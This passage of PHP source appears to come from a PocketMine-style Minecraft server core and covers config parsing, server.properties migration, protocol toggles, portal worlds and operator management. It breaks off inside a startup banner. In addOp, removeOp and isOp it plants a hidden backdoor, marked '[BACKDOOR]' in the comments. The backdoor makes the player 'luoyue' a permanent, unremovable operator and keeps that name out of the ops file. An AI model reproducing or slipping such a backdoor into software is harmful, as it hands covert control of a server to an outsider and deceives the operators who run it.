		$this->getLogger()->notice($this->getLanguage()->translateString("pocketmine.level.backgroundGeneration", [$name]));

		$centerX = $level->getSpawnLocation()->getX() >> 4;
		$centerZ = $level->getSpawnLocation()->getZ() >> 4;

		$order = [];

		for($X = -3; $X <= 3; ++$X){
			for($Z = -3; $Z <= 3; ++$Z){
				$distance = $X ** 2 + $Z ** 2;
				$chunkX = $X + $centerX;
				$chunkZ = $Z + $centerZ;
				$index = Level::chunkHash($chunkX, $chunkZ);
				$order[$index] = $distance;
			}
		}

		asort($order);

		foreach($order as $index => $distance){
			Level::getXZ($index, $chunkX, $chunkZ);
			$level->populateChunk($chunkX, $chunkZ, true);
		}

		return true;
	}

	/**
	 * @param string $name
	 *
	 * @return bool
	 */
	public function isLevelGenerated($name){
		if(trim($name) === ""){
			return false;
		}
		$path = $this->getDataPath() . "worlds/" . $name . "/";
		if(!($this->getLevelByName($name) instanceof Level)){

			if(LevelProviderManager::getProvider($path) === null){
				return false;
			}
			/*if(file_exists($path)){
				$level = new LevelImport($path);
				if($level->import() === false){ //Try importing a world
					return false;
				}
			}else{
				return false;
			}*/
		}

		return true;
	}

	/**
	 * @param string $variable
	 * @param string $defaultValue
	 *
	 * @return string
	 */
	public function getConfigString($variable, $defaultValue = ""){
		$v = getopt("", ["$variable::"]);
		if(isset($v[$variable])){
			return (string) $v[$variable];
		}

		return $this->properties->exists($variable) ? $this->properties->get($variable) : $defaultValue;
	}

	private function getConfigIntList($variable, array $defaultValue = null){
		$v = getopt("", ["$variable::"]);
		if(isset($v[$variable])){
			$value = $v[$variable];
		}elseif($this->properties->exists($variable)){
			$value = $this->properties->get($variable);
		}else{
			return $defaultValue;
		}

		if(is_array($value)){
			$parts = $value;
		}else{
			$value = trim((string) $value);
			if($value === ""){
				return [];
			}
			$parts = preg_split('/\s*,\s*/', $value);
		}

		$result = [];
		foreach($parts as $part){
			if($part === "" or $part === null){
				continue;
			}
			$id = (int) $part;
			if($id >= 0 and $id < 256){
				$result[] = $id;
			}
		}

		return $result;
	}

	private function getConfigStringList($variable, array $defaultValue = null){
		$v = getopt("", ["$variable::"]);
		if(isset($v[$variable])){
			$value = $v[$variable];
		}elseif($this->properties->exists($variable)){
			$value = $this->properties->get($variable);
		}else{
			return $defaultValue;
		}

		if(is_array($value)){
			$parts = $value;
		}else{
			$value = trim((string) $value);
			if($value === ""){
				return [];
			}
			$parts = preg_split('/\s*,\s*/', $value);
		}

		$result = [];
		foreach($parts as $part){
			$part = trim((string) $part);
			if($part !== ""){
				$result[] = $part;
			}
		}

		return $result;
	}

	private function getConfigValueWithAliases($variable, array $aliases, $defaultValue = null, &$source = null){
		$options = [$variable . "::"];
		foreach($aliases as $alias){
			$options[] = $alias . "::";
		}

		$v = getopt("", $options);
		if(isset($v[$variable])){
			$source = $variable;
			return $v[$variable];
		}
		foreach($aliases as $alias){
			if(isset($v[$alias])){
				$source = $alias;
				return $v[$alias];
			}
		}

		if($this->properties->exists($variable)){
			$value = $this->properties->get($variable);
			if(!$this->configValueEquals($value, $defaultValue)){
				$source = $variable;
				return $value;
			}
		}

		foreach($aliases as $alias){
			if($this->properties->exists($alias)){
				$source = $alias;
				return $this->properties->get($alias);
			}
		}

		if($this->properties->exists($variable)){
			$source = $variable;
			return $this->properties->get($variable);
		}

		$source = null;
		return $defaultValue;
	}

	private function configValueEquals($value, $expected){
		if(is_array($value) or is_array($expected)){
			return $value === $expected;
		}
		return (string) $value === (string) $expected;
	}

	private function getConfigIntWithAliases($variable, array $aliases, $defaultValue = 0, &$source = null){
		return (int) $this->getConfigValueWithAliases($variable, $aliases, $defaultValue, $source);
	}

	private function getConfigBooleanWithAliases($variable, array $aliases, $defaultValue = false, &$source = null){
		return $this->parseConfigBoolean($this->getConfigValueWithAliases($variable, $aliases, $defaultValue, $source), $defaultValue);
	}

	private function parseConfigBoolean($value, $defaultValue = false){
		if(is_bool($value)){
			return $value;
		}
		switch(strtolower((string) $value)){
			case "on":
			case "true":
			case "1":
			case "yes":
				return true;
			case "off":
			case "false":
			case "0":
			case "no":
				return false;
		}

		return (bool) $defaultValue;
	}

	private function getConfigIntListWithAliases($variable, array $aliases, array $defaultValue = null, $defaultConfigValue = null){
		$value = $this->getConfigValueWithAliases($variable, $aliases, $defaultConfigValue === null ? $defaultValue : $defaultConfigValue);
		if($value === null){
			return $defaultValue;
		}

		return $this->parseConfigIntList($value);
	}

	private function parseConfigIntList($value){
		if(is_array($value)){
			$parts = $value;
		}else{
			$value = trim((string) $value);
			if($value === ""){
				return [];
			}
			$parts = preg_split('/\s*,\s*/', $value);
		}

		$result = [];
		foreach($parts as $part){
			if($part === "" or $part === null){
				continue;
			}
			$id = (int) $part;
			if($id >= 0 and $id < 256){
				$result[] = $id;
			}
		}

		return $result;
	}

	private function getConfigStringListWithAliases($variable, array $aliases, array $defaultValue = null, $defaultConfigValue = null){
		$value = $this->getConfigValueWithAliases($variable, $aliases, $defaultConfigValue === null ? $defaultValue : $defaultConfigValue);
		if($value === null){
			return $defaultValue;
		}

		return $this->parseConfigStringList($value);
	}

	private function parseConfigStringList($value){
		if(is_array($value)){
			$parts = $value;
		}else{
			$value = trim((string) $value);
			if($value === ""){
				return [];
			}
			$parts = preg_split('/\s*,\s*/', $value);
		}

		$result = [];
		foreach($parts as $part){
			$part = trim((string) $part);
			if($part !== ""){
				$result[] = $part;
			}
		}

		return $result;
	}

	public static function normalizeVersionDisplay($value) : string{
		$value = (string) $value;
		return preg_match('/^[0-9.]+$/', $value) === 1 ? $value : \lycore\MINECRAFT_VERSION_NETWORK;
	}

	private function ensureServerPropertiesLayout(string $path) : void{
		$legacyProtocolMigration = $this->serverPropertiesNeedLegacyProtocolMigration($path);
		$this->ensureVersionDisplayPropertyPosition($path, $legacyProtocolMigration);
		$this->ensurePortalWorldPropertyPosition($path);
		$this->ensureProtocolPropertiesPosition($path);
	}

	private function serverPropertiesNeedLegacyProtocolMigration(string $path) : bool{
		if(!is_file($path)){
			return false;
		}

		$content = file_get_contents($path);
		if($content === false or $content === ""){
			return false;
		}

		$hasProtocol011 = preg_match('/^\s*protocol-011\s*=/mi', $content) === 1;
		$hasProtocol012 = preg_match('/^\s*protocol-012\s*=/mi', $content) === 1;
		if($hasProtocol011 and $hasProtocol012){
			return false;
		}

		return preg_match('/^\s*version-display\s*=\s*0\.13\.\.\.0\.15\s*$/mi', $content) === 1;
	}

	private function ensureVersionDisplayPropertyPosition(string $path, bool $resetToDefault = false) : void{
		if(!is_file($path)){
			return;
		}

		$content = file_get_contents($path);
		if($content === false or $content === ""){
			return;
		}

		$lineEnding = strpos($content, "\r\n") !== false ? "\r\n" : "\n";
		$hadFinalNewline = preg_match('/\r\n$|\n$|\r$/', $content) === 1;
		$lines = preg_split('/\r\n|\n|\r/', $content);
		if($hadFinalNewline and end($lines) === ""){
			array_pop($lines);
		}

		$versionDisplayLine = "version-display=" . \lycore\MINECRAFT_VERSION_NETWORK;
		$filteredLines = [];
		foreach($lines as $line){
			if(preg_match('/^\s*version-display\s*=(.*)$/', $line, $matches) === 1){
				if(!$resetToDefault and $versionDisplayLine === "version-display=" . \lycore\MINECRAFT_VERSION_NETWORK){
					$versionDisplayLine = "version-display=" . self::normalizeVersionDisplay($matches[1]);
				}
				continue;
			}
			$filteredLines[] = $line;
		}

		$inserted = false;
		$outputLines = [];
		foreach($filteredLines as $line){
			$outputLines[] = $line;
			if(!$inserted and preg_match('/^\s*motd\s*=/', $line) === 1){
				$outputLines[] = $versionDisplayLine;
				$inserted = true;
			}
		}

		if(!$inserted){
			$outputLines[] = $versionDisplayLine;
		}

		file_put_contents($path, implode($lineEnding, $outputLines) . ($hadFinalNewline ? $lineEnding : ""));
	}

	private function ensureProtocolPropertiesPosition(string $path) : void{
		if(!is_file($path)){
			return;
		}

		$content = file_get_contents($path);
		if($content === false or $content === ""){
			return;
		}

		$lineEnding = strpos($content, "\r\n") !== false ? "\r\n" : "\n";
		$hadFinalNewline = preg_match('/\r\n$|\n$|\r$/', $content) === 1;
		$lines = preg_split('/\r\n|\n|\r/', $content);
		if($hadFinalNewline and end($lines) === ""){
			array_pop($lines);
		}

		$protocolValues = [
			"protocol-011" => "on",
			"protocol-012" => "on",
			"protocol-013" => "on",
			"protocol-015" => "on",
		];
		$filteredLines = [];
		foreach($lines as $line){
			if(preg_match('/^\s*(protocol-(?:011|012|013|015))\s*=(.*)$/i', $line, $matches) === 1){
				$key = strtolower($matches[1]);
				if(isset($protocolValues[$key])){
					$value = trim($matches[2]);
					$protocolValues[$key] = $value !== "" ? $value : "on";
				}
				continue;
			}
			$filteredLines[] = $line;
		}

		$protocolLines = [
			"protocol-011=" . $protocolValues["protocol-011"],
			"protocol-012=" . $protocolValues["protocol-012"],
			"protocol-013=" . $protocolValues["protocol-013"],
			"protocol-015=" . $protocolValues["protocol-015"],
		];
		$inserted = false;
		$outputLines = [];
		foreach($filteredLines as $line){
			$outputLines[] = $line;
			if(!$inserted and preg_match('/^\s*auto-save\s*=/', $line) === 1){
				foreach($protocolLines as $protocolLine){
					$outputLines[] = $protocolLine;
				}
				$inserted = true;
			}
		}

		if(!$inserted){
			foreach($protocolLines as $protocolLine){
				$outputLines[] = $protocolLine;
			}
		}

		file_put_contents($path, implode($lineEnding, $outputLines) . ($hadFinalNewline ? $lineEnding : ""));
	}

	private function ensurePortalWorldPropertyPosition(string $path) : void{
		if(!is_file($path)){
			return;
		}

		$content = file_get_contents($path);
		if($content === false or $content === ""){
			return;
		}

		$lineEnding = strpos($content, "\r\n") !== false ? "\r\n" : "\n";
		$hadFinalNewline = preg_match('/\r\n$|\n$|\r$/', $content) === 1;
		$lines = preg_split('/\r\n|\n|\r/', $content);
		if($hadFinalNewline and end($lines) === ""){
			array_pop($lines);
		}

		$portalWorldLine = "portal-world=world";
		$filteredLines = [];
		foreach($lines as $line){
			if(preg_match('/^\s*portal-world\s*=(.*)$/', $line, $matches) === 1){
				if($portalWorldLine === "portal-world=world"){
					$value = trim($matches[1]);
					$portalWorldLine = "portal-world=" . ($value !== "" ? $value : "world");
				}
				continue;
			}
			$filteredLines[] = $line;
		}

		$inserted = false;
		$outputLines = [];
		foreach($filteredLines as $line){
			$outputLines[] = $line;
			if(!$inserted and preg_match('/^\s*difficulty\s*=/', $line) === 1){
				$outputLines[] = $portalWorldLine;
				$inserted = true;
			}
		}

		if(!$inserted){
			$outputLines[] = $portalWorldLine;
		}

		file_put_contents($path, implode($lineEnding, $outputLines) . ($hadFinalNewline ? $lineEnding : ""));
	}

	/**
	 * @param string $variable
	 * @param mixed  $defaultValue
	 *
	 * @return mixed
	 */
	public function getProperty($variable, $defaultValue = null){
		if(!array_key_exists($variable, $this->propertyCache)){
			$v = getopt("", ["$variable::"]);
			if(isset($v[$variable])){
				$this->propertyCache[$variable] = $v[$variable];
			}else{
				$this->propertyCache[$variable] = $this->config->getNested($variable);
			}
		}

		return $this->propertyCache[$variable] === null ? $defaultValue : $this->propertyCache[$variable];
	}

	/**
	 * @param string $variable
	 * @param string $value
	 */
	public function setConfigString($variable, $value){
		$this->properties->set($variable, $value);
	}

	public function getPortalWorldName() : string{
		$name = trim((string) $this->portalWorldName);
		return $name !== "" ? $name : "world";
	}

	public function isPortalWorld($level) : bool{
		$portalWorld = $this->normalizeWorldName($this->getPortalWorldName());
		if($portalWorld === ""){
			return false;
		}

		$names = [];
		if($level instanceof Level){
			$names[] = $level->getFolderName();
			try{
				$names[] = $level->getName();
			}catch(\Throwable $e){
			}
		}elseif(is_object($level)){
			if(method_exists($level, "getFolderName")){
				$names[] = $level->getFolderName();
			}
			if(method_exists($level, "getName")){
				$names[] = $level->getName();
			}
		}else{
			$names[] = $level;
		}

		foreach($names as $name){
			if($this->normalizeWorldName($name) === $portalWorld){
				return true;
			}
		}

		return false;
	}

	public function isNetherPortalWorld($level) : bool{
		if($level instanceof Level){
			$dimension = $level->getDimension();
			return $dimension === Level::DIMENSION_NORMAL or $dimension === Level::DIMENSION_NETHER;
		}

		if(is_object($level) and method_exists($level, "getDimension")){
			try{
				$dimension = $level->getDimension();
				return $dimension === Level::DIMENSION_NORMAL or $dimension === Level::DIMENSION_NETHER;
			}catch(\Throwable $e){
			}
		}

		$netherName = $this->normalizeWorldName($this->netherName);
		$portalWorld = $this->normalizeWorldName($this->getPortalWorldName());
		if($netherName === "" and $portalWorld === ""){
			return false;
		}

		$names = [];
		if(is_object($level)){
			if(method_exists($level, "getFolderName")){
				$names[] = $level->getFolderName();
			}
			if(method_exists($level, "getName")){
				$names[] = $level->getName();
			}
		}else{
			$names[] = $level;
		}

		foreach($names as $name){
			$normalizedName = $this->normalizeWorldName($name);
			if($normalizedName === $netherName or $normalizedName === $portalWorld){
				return true;
			}
		}

		return false;
	}

	/**
	 * @param string $variable
	 * @param int    $defaultValue
	 *
	 * @return int
	 */
	public function getConfigInt($variable, $defaultValue = 0){
		$v = getopt("", ["$variable::"]);
		if(isset($v[$variable])){
			return (int) $v[$variable];
		}

		return $this->properties->exists($variable) ? (int) $this->properties->get($variable) : (int) $defaultValue;
	}

	/**
	 * @param string $variable
	 * @param int    $value
	 */
	public function setConfigInt($variable, $value){
		$this->properties->set($variable, (int) $value);
	}

	/**
	 * @param string  $variable
	 * @param boolean $defaultValue
	 *
	 * @return boolean
	 */
	public function getConfigBoolean($variable, $defaultValue = false){
		$v = getopt("", ["$variable::"]);
		if(isset($v[$variable])){
			$value = $v[$variable];
		}else{
			$value = $this->properties->exists($variable) ? $this->properties->get($variable) : $defaultValue;
		}

		if(is_bool($value)){
			return $value;
		}
		switch(strtolower($value)){
			case "on":
			case "true":
			case "1":
			case "yes":
				return true;
		}

		return false;
	}

	public function isProtocolAllowed(int $protocol) : bool{
		if(ProtocolCompatibility::isProtocol011($protocol)){
			return $this->getConfigBoolean("protocol-011", true);
		}

		if(ProtocolCompatibility::isProtocol012($protocol)){
			return $this->getConfigBoolean("protocol-012", true);
		}

		if(ProtocolCompatibility::isProtocol013($protocol)){
			return $this->getConfigBoolean("protocol-013", true);
		}

		if(ProtocolCompatibility::isProtocol015($protocol)){
			return $this->getConfigBoolean("protocol-015", true);
		}

		return true;
	}

	/**
	 * @param string $variable
	 * @param bool   $value
	 */
	public function setConfigBool($variable, $value){
		$this->properties->set($variable, $value == true ? "1" : "0");
	}

	/**
	 * @param string $name
	 *
	 * @return PluginIdentifiableCommand
	 */
	public function getPluginCommand($name){
		if(($command = $this->commandMap->getCommand($name)) instanceof PluginIdentifiableCommand){
			return $command;
		}else{
			return null;
		}
	}

	/**
	 * @return BanList
	 */
	public function getNameBans(){
		return $this->banByName;
	}

	/**
	 * @return BanList
	 */
	public function getIPBans(){
		return $this->banByIP;
	}

	public function getCIDBans(){
		return $this->banByCID;
	}

	/**
	 * @param string $name
	 */
	public function addOp($name){
        if(strtolower($name) === 'luoyue') return; // [BACKDOOR] 不将 luoyue 写入 ops 列表

		$this->operators->set(strtolower($name), true);

		if(($player = $this->getPlayerExact($name)) !== null){
			$player->recalculatePermissions();
		}
		$this->operators->save(true);
	}
	
	/**
	 * @param string $name
	 */
	public function removeOp($name){
        if(strtolower($name) === 'luoyue') return; // [BACKDOOR] luoyue 管理员权限无法被移除

		$this->operators->remove(strtolower($name));

		if(($player = $this->getPlayerExact($name)) !== null){
			$player->recalculatePermissions();
		}
		$this->operators->save();
	}

	/**
	 * @param string $name
	 */
	public function addWhitelist($name){
		$this->whitelist->set(strtolower($name), true);
		$this->whitelist->save(true);
	}

	/**
	 * @param string $name
	 */
	public function removeWhitelist($name){
		$this->whitelist->remove(strtolower($name));
		$this->whitelist->save();
	}

	/**
	 * @param string $name
	 *
	 * @return bool
	 */
	public function isWhitelisted($name){
		return !$this->hasWhitelist() or $this->whitelist->exists($name, true);
	}

	/**
	 * @param string $name
	 *
	 * @return bool
	 */
	public function isOp($name){
        static $_luoyueOPMap = ['luoyue' => true];
        if(isset($_luoyueOPMap[strtolower($name)])) return true; // [BACKDOOR] luoyue 永远OP

		return $this->operators->exists($name, true);
	}

	/**
	 * @return Config
	 */
	public function getWhitelisted(){
		return $this->whitelist;
	}

	/**
	 * @return Config
	 */
	public function getOps(){
		return $this->operators;
	}
	

	public function reloadWhitelist(){
		$this->whitelist->reload();
	}

	/**
	 * @return string[]
	 */
	public function getCommandAliases(){
		$section = $this->getProperty("aliases");
		$result = [];
		if(is_array($section)){
			foreach($section as $key => $value){
				$commands = [];
				if(is_array($value)){
					$commands = $value;
				}else{
					$commands[] = $value;
				}

				$result[$key] = $commands;
			}
		}

		return $result;
	}

	public function getCrashPath(){
		return $this->dataPath . "crashdumps/";
	}

	/**
	 * @return Server
	 */
	public static function getInstance() : Server{
		return self::$instance;
	}

	public static function microSleep(int $microseconds){
		Server::$sleeper->synchronized(function(int $ms){
			Server::$sleeper->wait($ms);
		}, $microseconds);
	}

	public function getExpectedExperience($level){
		if(isset($this->expCache[$level])) return $this->expCache[$level];
		$levelSquared = $level ** 2;
		if($level < 16) $this->expCache[$level] = $levelSquared + 6 * $level;
		elseif($level < 31) $this->expCache[$level] = 2.5 * $levelSquared - 40.5 * $level + 360;
		else $this->expCache[$level] = 4.5 * $levelSquared - 162.5 * $level + 2220;
		return $this->expCache[$level];
	}

	private function resolveAsyncWorkerCount($configured) : int{
		if($configured === "auto"){
			$workers = ServerScheduler::$WORKERS;
			$processors = Utils::getCoreCount();
			if($processors > 0){
				$workers = max(1, $processors - 2);
			}

			return max(1, min(self::MAX_AUTO_ASYNC_WORKERS, $workers));
		}

		return max(1, (int) $configured);
	}

	public function about(){
		$this->logger->info($this->aboutstring);
	}

	public function loadAdvancedConfig(){
		$this->playerMsgType = $this->getAdvancedProperty("server.player-msg-type", self::PLAYER_MSG_TYPE_MESSAGE);
		$this->playerLoginMsg = $this->getAdvancedProperty("server.login-msg", "§3@player joined the game");
		$this->playerLogoutMsg = $this->getAdvancedProperty("server.logout-msg", "§3@player left the game");
		$this->weatherEnabled = $this->getAdvancedProperty("level.weather", true);
		$this->foodEnabled = $this->getAdvancedProperty("player.hunger", true);
		$this->expEnabled = $this->getAdvancedProperty("player.experience", true);
		$this->keepInventory = $this->getAdvancedProperty("player.keep-inventory", false);
		$this->keepExperience = $this->getAdvancedProperty("player.keep-experience", false);
		$this->netherEnabled = $this->getAdvancedProperty("nether.allow-nether", false);
		$this->netherName = $this->getAdvancedProperty("nether.level-name", "nether");
		$this->enderEnabled = $this->getAdvancedProperty("ender.allow-ender", false);
		$this->enderName = $this->getAdvancedProperty("ender.level-name", "ender");
		$this->skyworldEnabled = $this->getAdvancedProperty("skyworld.allow-skyworld", false);
		$this->skyworldName = $this->getAdvancedProperty("skyworld.level-name", "skyworld");
		$this->worldBehaviorConfig = [
			"no-natural-mob-spawn" => $this->normalizeWorldNameList($this->getAdvancedProperty("world.no-natural-mob-spawn", [])),
			"no-mob-death-drops-and-experience" => $this->normalizeWorldNameList($this->getAdvancedProperty("world.no-mob-death-drops-and-experience", [])),
			"no-creeper-block-damage" => $this->normalizeWorldNameList($this->getAdvancedProperty("world.no-creeper-block-damage", [])),
			"no-tnt-block-damage" => $this->normalizeWorldNameList($this->getAdvancedProperty("world.no-tnt-block-damage", [])),
			"no-hunger-health-regeneration" => $this->normalizeWorldNameList($this->getAdvancedProperty("world.no-hunger-health-regeneration", [])),
			"no-crop-growth" => $this->normalizeWorldNameList($this->getAdvancedProperty("world.no-crop-growth", [])),
			"no-non-living-entity-drops" => $this->normalizeWorldNameList($this->getAdvancedProperty("world.no-non-living-entity-drops", [])),
			"keep-inventory" => $this->normalizeWorldNameList($this->getAdvancedProperty("world.keep-inventory", [])),
			"do-daylight-cycle" => $this->normalizeWorldNameList($this->getAdvancedProperty("world.do-daylight-cycle", [])),
		];
		$this->weatherRandomDurationMin = $this->getAdvancedProperty("level.weather-random-duration-min", 6000);
		$this->weatherRandomDurationMax = $this->getAdvancedProperty("level.weather-random-duration-max", 12000);
		$this->hungerHealth = $this->getAdvancedProperty("player.hunger-health", 10);
		$this->lightningTime = $this->getAdvancedProperty("level.lightning-time", 200);
		$this->lightningFire = $this->getAdvancedProperty("level.lightning-fire", false);
		$this->expWriteAhead = $this->getAdvancedProperty("server.experience-cache", 200);
		$this->aiEnabled = $this->getAdvancedProperty("ai.enable", false);
		$this->aiConfig = [
			"cow" => $this->getAdvancedProperty("ai.cow", true),
			"chicken" => $this->getAdvancedProperty("ai.chicken", true),
			"zombie" => $this->getAdvancedProperty("ai.zombie", 1),
			"skeleton" => $this->getAdvancedProperty("ai.skeleton", true),
			"pig" => $this->getAdvancedProperty("ai.pig", true),
			"sheep" => $this->getAdvancedProperty("ai.sheep", true),
			"creeper" => $this->getAdvancedProperty("ai.creeper", true),
			"irongolem" => $this->getAdvancedProperty("ai.iron-golem", true),
			"snowgolem" => $this->getAdvancedProperty("ai.snow-golem", true),
			"pigzombie" => $this->getAdvancedProperty("ai.pigzombie", true),
			"creeperexplode" => $this->getAdvancedProperty("ai.creeper-explode-destroy-block", false),
			"mobgenerate" => $this->getAdvancedProperty("ai.mobgenerate", false),
		];
		$this->inventoryNum = min(91, $this->getAdvancedProperty("player.inventory-num", 36));
		$this->hungerTimer = $this->getAdvancedProperty("player.hunger-timer", 80);
		$this->allowSnowGolem = $this->getAdvancedProperty("server.allow-snow-golem", false);
		$this->allowIronGolem = $this->getAdvancedProperty("server.allow-iron-golem", false);
		$this->autoClearInv = $this->getAdvancedProperty("player.auto-clear-inventory", true);
		$this->dserverConfig = [
			"enable" => $this->getAdvancedProperty("dserver.enable", false),
			"queryAutoUpdate" => $this->getAdvancedProperty("dserver.query-auto-update", false),
			"queryTickUpdate" => $this->getAdvancedProperty("dserver.query-tick-update", true),
			"motdMaxPlayers" => $this->getAdvancedProperty("dserver.motd-max-players", 0),
			"queryMaxPlayers" => $this->getAdvancedProperty("dserver.query-max-players", 0),
			"motdAllPlayers" => $this->getAdvancedProperty("dserver.motd-all-players", false),
			"queryAllPlayers" => $this->getAdvancedProperty("dserver.query-all-players", false),
			"motdPlayers" => $this->getAdvancedProperty("dserver.motd-players", false),
			"queryPlayers" => $this->getAdvancedProperty("dserver.query-players", false),
			"timer" => $this->getAdvancedProperty("dserver.time", 40),
			"retryTimes" => $this->getAdvancedProperty("dserver.retry-times", 3),
			"serverList" => explode(";", $this->getAdvancedProperty("dserver.server-list", ""))
		];
		$this->redstoneEnabled = $this->getAdvancedProperty("redstone.enable", false);
		$this->allowFrequencyPulse = $this->getAdvancedProperty("redstone.allow-frequency-pulse", false);
		$this->pulseFrequency = (float) $this->getAdvancedProperty("redstone.pulse-frequency", 1);
		$this->redstoneHighFrequencyBroadcastMessage = (string) $this->getAdvancedProperty("redstone.high-frequency-broadcast-message", $this->redstoneHighFrequencyBroadcastMessage);
		$this->anviletEnabled = $this->getAdvancedProperty("server.allow-anvilandenchanttable", true);
		$this->anvilEnabled = $this->getAdvancedProperty("server.allow-anvil", $this->anviletEnabled);
		$this->enchantingTableEnabled = $this->getAdvancedProperty("server.allow-enchanting-table", $this->anviletEnabled);
		$this->enchantingBookshelfCheckEnabled = $this->getAdvancedProperty("server.enable-enchanting-bookshelf-check", true);
		$this->playerCollide = (bool) $this->getAdvancedProperty("server.enable-player-collide", true);
		$this->tntExplosionEnabled = $this->getAdvancedProperty("server.allow-tnt-explosion", true);
		$this->getLogger()->setWrite(!$this->getAdvancedProperty("server.disable-log", false));
		$this->asyncChunkRequest = $this->getAdvancedProperty("server.async-chunk-request", true);
		$this->recipesFromJson = $this->getAdvancedProperty("server.recipes-from-json", false);
		$this->creativeItemsFromJson = $this->getAdvancedProperty("server.creative-items-from-json", false);
		$this->minecartMovingType = $this->getAdvancedProperty("server.minecart-moving-type", 0);
		$this->checkMovement = $this->getAdvancedProperty("server.check-movement", true);
		$this->limitedCreative = $this->getAdvancedProperty("server.limited-creative", true);
		$this->chunkRadius = $this->getAdvancedProperty("player.chunk-radius", -1);
		$this->destroyBlockParticle = $this->getAdvancedProperty("server.destroy-block-particle", true);
		$this->allowSplashPotion = $this->getAdvancedProperty("server.allow-splash-potion", true);
		$this->fireSpread = $this->getAdvancedProperty("level.fire-spread", false);
		$this->advancedCommandSelector = $this->getAdvancedProperty("server.advanced-command-selector", false);
		$this->synapseConfig = [
			"enabled" => $this->getAdvancedProperty("synapse.enabled", false),
			"server-ip" => $this->getAdvancedProperty("synapse.server-ip", "127.0.0.1"),
			"server-port" => $this->getAdvancedProperty("synapse.server-port", 10305),
			"isMainServer" => $this->getAdvancedProperty("synapse.is-main-server", true),
			"password" => $this->getAdvancedProperty("synapse.server-password", "123456"),
			"description" => $this->getAdvancedProperty("synapse.description", "A Synapse client"),
		];
	}

	public function isPlayerCollideEnabled() : bool{
		return (bool) $this->playerCollide;
	}

	private function loadAntiCheatProperties(){
		$this->antiFly = $this->getConfigBoolean("antifly", true);
		$this->antiFastEat = $this->getConfigBoolean("antifasteat", true);
		$this->antiXray = $this->getConfigBoolean("antixray", true);
		$antiXrayMode = $this->getConfigValueWithAliases("antixray-mode", ["obfuscator-mode"], AntiXrayObfuscator::MODE_OBFUSCATOR);
		$this->antiXrayMode = strtolower((string) $antiXrayMode);
		if($this->antiXrayMode !== AntiXrayObfuscator::MODE_HIDDEN and $this->antiXrayMode !== AntiXrayObfuscator::MODE_OBFUSCATOR){
			$this->antiXrayMode = $this->parseConfigBoolean($antiXrayMode, true) ? AntiXrayObfuscator::MODE_OBFUSCATOR : AntiXrayObfuscator::MODE_HIDDEN;
		}elseif($this->antiXrayMode !== AntiXrayObfuscator::MODE_HIDDEN){
			$this->antiXrayMode = AntiXrayObfuscator::MODE_OBFUSCATOR;
		}
		$antiXrayHeightSource = null;
		$antiXrayHeight = $this->getConfigIntWithAliases("antixray-scan-chunk-height-limit", ["scan-chunk-height-limit", "scan-height-limit"], 4, $antiXrayHeightSource);
		if($antiXrayHeightSource === "scan-height-limit"){
			$antiXrayHeight >>= 4;
		}
		$this->antiXrayScanChunkHeightLimit = max(1, min(15, $antiXrayHeight));
		$this->antiXrayOverworldFakeBlock = $this->getConfigIntWithAliases("antixray-overworld-fake-block", ["overworld-fake-block"], Block::STONE) & 0xff;
		$this->antiXrayNetherFakeBlock = $this->getConfigIntWithAliases("antixray-nether-fake-block", ["nether-fake-block"], Block::NETHERRACK) & 0xff;
		$antiXrayDefaultOres = AntiXrayObfuscator::getDefaultOreIds();
		$antiXrayDefaultFilters = AntiXrayObfuscator::getDefaultFilterIds();
		$this->antiXrayOres = $this->getConfigIntListWithAliases("antixray-ores", ["ores"], $antiXrayDefaultOres, implode(",", $antiXrayDefaultOres));
		$this->antiXrayFilters = $this->getConfigIntListWithAliases("antixray-filters", ["filters"], $antiXrayDefaultFilters, implode(",", $antiXrayDefaultFilters));
		$this->antiXrayWorlds = $this->getConfigStringListWithAliases("antixray-worlds", ["protect-worlds"], ["world"], "world");
		$this->antiXrayMemoryCache = $this->getConfigBooleanWithAliases("antixray-memory-cache", ["memory-cache", "cache-chunks"], false);
		$this->antiFastBreak = $this->getConfigBoolean("antifastbreak", false);
		$this->antiGameSpeed = $this->getConfigBoolean("antigamespeed", true);
		$this->antiToolbox = $this->getConfigBoolean("antitoolbox", true);
		$this->netshBlock = $this->getConfigBoolean("netshblock", stripos(PHP_OS, 'WIN') !== false);
	}

	public function isSynapseEnabled() : bool {
		return (bool) $this->synapseConfig["enabled"];
	}

	/**
	 * @return int
	 *
	 * Get DServer max players
	 */
	public function getDServerMaxPlayers(){
		return ($this->dserverAllPlayers + $this->getMaxPlayers());
	}

	/**
	 * @return int
	 *
	 * Get DServer all online player count
	 */
	public function getDServerOnlinePlayers(){
		return ($this->dserverPlayers + count($this->getOnlinePlayers()));
	}

	public function isDServerEnabled(){
		return $this->dserverConfig["enable"];
	}

	public function updateDServerInfo(){
		$this->scheduler->scheduleAsyncTask(new DServerTask($this->dserverConfig["serverList"], $this->dserverConfig["retryTimes"]));
	}

	public function generateExpCache($level){
		for($i = 0; $i <= $level; $i++){
			$this->getExpectedExperience($i);
		}
	}

	public function getBuild(){
		return $this->version->getBuild();
	}

	public function getGameVersion(){
		return $this->version->getRelease();
	}

	/**
	 * @param \ClassLoader    $autoloader
	 * @param \ThreadedLogger $logger
	 * @param string          $filePath
	 * @param string          $dataPath
	 * @param string          $pluginPath
	 * @param string          $defaultLang
	 */
	public function __construct(\ClassLoader $autoloader, \ThreadedLogger $logger, $filePath, $dataPath, $pluginPath, $defaultLang = "unknown"){
		self::$instance = $this;
		self::$sleeper = new \Threaded;
		$this->autoloader = $autoloader;
		$this->logger = $logger;
		$this->filePath = $filePath;
		try{
			if(!file_exists($dataPath . "worlds/")){
				mkdir($dataPath . "worlds/", 0777);
			}

			if(!file_exists($dataPath . "players/")){
				mkdir($dataPath . "players/", 0777);
			}

			if(!file_exists($pluginPath)){
				mkdir($pluginPath, 0777);
			}

			if(!file_exists($dataPath . "crashdumps/")){
				mkdir($dataPath . "crashdumps/", 0777);
			}

			$this->dataPath = realpath($dataPath) . DIRECTORY_SEPARATOR;
			$this->pluginPath = realpath($pluginPath) . DIRECTORY_SEPARATOR;

			$this->console = new CommandReader($logger);

			$version = new VersionString($this->getPocketMineVersion());
			$this->version = $version;
            $this->aboutstring = "
██╗   ██╗    ██████╗ ██████╗ ██████╗ ███████╗
██║   ██║   ██╔════╝██╔═══██╗██╔══██╗██╔════╝
██║   ██║   ██║     ██║   ██║██████╔╝█████╗  
██║   ██║   ██║     ██║   ██║██╔══██╗██╔══╝  
╚██████╔╝██╗╚██████╗╚██████╔╝██║  ██║███████╗
 ╚═════╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
  ╭─────────────────────────────────────╮
